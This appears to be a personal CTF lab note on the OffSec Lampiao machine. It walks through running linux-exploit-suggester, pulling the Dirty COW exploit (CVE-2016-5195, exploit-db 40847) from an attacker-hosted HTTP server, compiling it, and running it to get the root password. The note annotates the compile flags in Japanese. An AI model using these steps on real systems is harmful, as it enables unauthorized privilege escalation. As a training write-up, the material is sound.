---
title: dirtycow2
parent: Attack Repository
grand_parent: Red Team
nav_order: 104
---

# vuln check
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

192.168.214.48 - - [17/May/2026 06:24:01] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
```

```bash
tiago@lampiao:/tmp$ chmod +x linux-exploit-suggester.sh 
```

```zsh
tiago@lampiao:/tmp$ ./linux-exploit-suggester.sh 


Available information:


[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

# cp & download
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh .
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Lampiao]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.214.48 - - [17/May/2026 06:14:42] "GET /40847.cpp HTTP/1.1" 200 -
```
# root password get
```zsh
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
```
- g++ .cpp をC++としてコンパイルする
- -Wall 警告を広く有効化
- -pedantic ISO標準から外れた記法を厳格チェック
- -O2 最適化オプション
- -std=c++11 C++11規格でコンパイル
- -pthread POSIX Threadサポート
- -o dirtycow2 出力ファイル名指定
- 40847.cpp 入力ソースコード
- -lutil libutil をリンク

```zsh
tiago@lampiao:/tmp$ ./dirtycow2 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
```